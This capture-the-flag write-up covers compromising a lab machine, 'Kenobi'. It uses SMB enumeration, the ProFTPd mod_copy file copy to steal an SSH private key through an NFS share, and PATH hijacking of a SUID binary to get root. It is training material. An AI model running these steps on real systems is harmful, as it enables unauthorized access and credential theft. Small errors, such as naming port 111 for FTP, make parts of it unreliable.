Let's start by performing a scan with Nmap to identify the services running on the target system. This scan reveals several open ports:

Port 21 (FTP): This indicates that ProFTPD, a File Transfer Protocol (FTP) server, is running. FTP allows users to upload and download files between computers.<br><br>
Port 22 (SSH): This signifies that Secure Shell (SSH) is available. SSH is a secure protocol for remote login and command execution.<br><br>
Port 80 (HTTP): This suggests the presence of a web server, likely hosting a website accessible through a web browser.<br><br>
Port 139/tcp (NetBIOS): This reveals that the machine supports NetBIOS, a networking protocol enabling computers on a local network to share resources like names, printers, and files.<br><br>
Ports associated with mountd (NFS): These open ports indicate that the system might be configured as an NFS server. NFS (Network File System) allows remote clients to access file systems shared by the server.<br><br>

It's important to note that port 80 doesn't necessarily guarantee a website's existence. Further investigation might be required to confirm the presence of a web server on port 80.<br><br>
Command parameters:<br>
-sCV: This flag tells Nmap to perform a SYN scan and a service version detection.<br>
-T4: Specifies the timing template used by Nmap during the scan.<br>
-Pn: Tells Nmap to skip the preliminary ping sweep.<br>
tee: Is a command-line utility used for redirecting output to both a file and the standard output stream, It is useful when you want to see the result of a command in the terminal and at the same time save it to a file.
<pre>
  <code>
~> nmap -sCV -T4 10.10.161.115 -Pn | tee kenobi\ nmap
  
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      39771/tcp   mountd
|   100005  1,2,3      52707/udp   mountd
|   100005  1,2,3      55276/udp6  mountd
|   100005  1,2,3      55325/tcp6  mountd
|   100021  1,3,4      40149/tcp   nlockmgr
|   100021  1,3,4      40271/tcp6  nlockmgr
|   100021  1,3,4      41907/udp   nlockmgr
|   100021  1,3,4      55255/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  �G��qX      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
39771/tcp open  mountd      1-3 (RPC #100005)
55015/tcp open  mountd      1-3 (RPC #100005)
59061/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-05-07T07:01:04-05:00
| smb2-time: 
|   date: 2024-05-07T12:01:04
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h36m46s, deviation: 2h53m12s, median: -3m14s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

  </code>
</pre>
<br><br>
I visited the website, but found nothing. I tried Gobuster to see if there was anything useful, but i had no luck.

<pre><code>
~> gobuster dir -u http://10.10.161.115/ -w /SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 | tee kenobi\ gobuster
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.161.115/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 193013 / 220561 (87.51%)[ERROR] Get "http://10.10.161.115/16379": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>
<br><br>
After enumerating by SBM I found the following shares.
<pre><code>
~> nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.161.115
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-07 09:44 -03
Nmap scan report for 10.10.161.115
Host is up (0.46s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.161.115\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.161.115\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.161.115\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 52.87 seconds
</code></pre>
<br><br>

We access to the machine through SMBClient with the password “anonymous”, inside we can see that there is a log.txt file.
<pre><code>
~> smbclient //10.10.161.115/anonymous
Password for [WORKGROUP\Arch]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 07:49:09 2019
  ..                                  D        0  Wed Sep  4 07:56:07 2019
  log.txt                             N    12237  Wed Sep  4 07:49:09 2019

		9204224 blocks of size 1024. 6855428 blocks available
</code></pre>
<br><br>
We download the file to our machine. Inside the .txt file you cansee that there are a lot of things, but what is relevant to us is that inside the machine there is a user “kenobi” and he has an id_rsa file, in SSH, an id_rsa file is a private file that stores the private key of a user for SSH authentication, so if we get that file we can access the machine.
<pre><code>smb: \> get log.txt

getting file \log.txt of size 12237 as log.txt (0,7 KiloBytes/sec) (average 0,7 KiloBytes/sec)</code></pre>
<br><br>

Since port 111 is open, it suggests NFS might be running on the target machine. We can use nmap to enumerate NFS exports. The output with an asterisk (*) for /var indicates that this directory, along with all its subdirectories, is potentially shared via NFS.
<pre><code>~> nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.231.175
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-08 21:38 -03
Nmap scan report for 10.10.231.175
Host is up (0.46s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds</code></pre>
<br><br>


As we previously discovered with nmap, port 111 is running ProFTPd version 1.3.5, so using Searchexploit we are going to see if this version has any vulnerability, we can see that ProFTPd 1.3.5 has a vulnerability which allows us to copy files/directories from one place to another on the server. Any unauthenticated client can exploit these commands to move files from any part of the file system, this is how we are going to get the id_rsa file.
<pre><code>~> searchsploit ProFTPd 1.3.5
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)         | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution               | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)           | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                         | linux/remote/36742.txt
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results</code></pre>
<br><br>

Let's connect to the target machine and move the id_rsa file to /tmp/.
<pre><code>~> nc 10.10.231.175 21</code></pre>
<pre><code> </code>~> SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name</pre>
<pre><code>~> SITE CPTO /var/tmp/id_rsa
250 Copy successful</code></pre>
<br><br>

Now let's mount NFS share locally.
<pre><code>/mnt> sudo mkdir /mnt/kenobiNSF</code></pre>
<pre><code>sudo mount 10.10.180.178:/var /mnt/kenobiNFS</code></pre>
<pre><code></code>~/kenobi> ls -la /mnt/kenobiNSF/tmp/
total 28
drwxrwxrwt  6 root root 4096 may  9 03:00 ./
drwxr-xr-x 14 root root 4096 sep  4  2019 ../
-rw-r--r--  1 maxi maxi 1675 may  9 03:00 id_rsa
drwx------  3 root root 4096 sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM/
drwx------  3 root root 4096 sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw/
drwx------  3 root root 4096 may  9 02:17 systemd-private-aa4435dcdd804e81af1fe0ab6786e412-systemd-timesyncd.service-Btl8xi/
drwx------  3 root root 4096 sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn/</pre>
<br><br>
Now that we have access to the id_rsa file we have to copy it to our working directory.
<pre><code>cp /mnt/kenobiNSF/tmp/id_rsa /home/Arch/kenobi/</code></pre>
<br><br>

We have to change the permissions of this file to 600 using chmod, it is necesary for a ssh logint to use the identify file.
<pre><code>~/kenobi> chmod 600 id_rsa</code></pre>

<pre><code>~/kenobi> ssh -i id_rsa kenobi@10.10.180.178</code></pre>
<br><br>
And we are in, let's get the first flag.
<pre><code>kenobi@kenobi:~$ ls
share  user.txt</code></pre>
<pre><code>kenobi@kenobi:~$ cat user.txt 
https://github.com/scriniariii/</code></pre>
<br><br>
For the next flag it is necessary to do a privilege escalation, This command finds all files on the system with the setuid (SUID) bit set, which means that they will be executed with the privileges of the owner of the file.
<pre><code>enobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6</code></pre>

The first thing that seems odd is a binary called menu, this binary executes the following 3 commands as root.
<pre><code>kenobi@kenobi:~/share$ /usr/bin/menu                        

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1     
HTTP/1.1 200 OK
Date: Thu, 09 May 2024 06:24:49 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html</code></pre>
<pre><code>** Enter your choice :2
4.8.0-58-generic</code></pre>
<br><br>
Create a file named ifconfig with the bash path, grant read, write and execute permissions for the ifconfig file, and add the current directory to the top of the command search list
<pre><code>
kenobi@kenobi:~/share$ echo /bin/bash > ifconfig
kenobi@kenobi:~/share$ chmod 777 ifconfig
kenobi@kenobi:~/share$ export PATH=.:$PATH</code></pre>
<pre><code>kenobi@kenobi:~/share$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.</code></pre>
<br><br>
Finally running the binary menu with the 3rd option gives us a bash with root.
<pre><code>root@kenobi:~/share# whoami
root</code></pre>
<pre><code>root@kenobi:~/share# cat /root/root.txt
Why'dYouOnlyCallMeWhenYou'reHigh</code></pre>
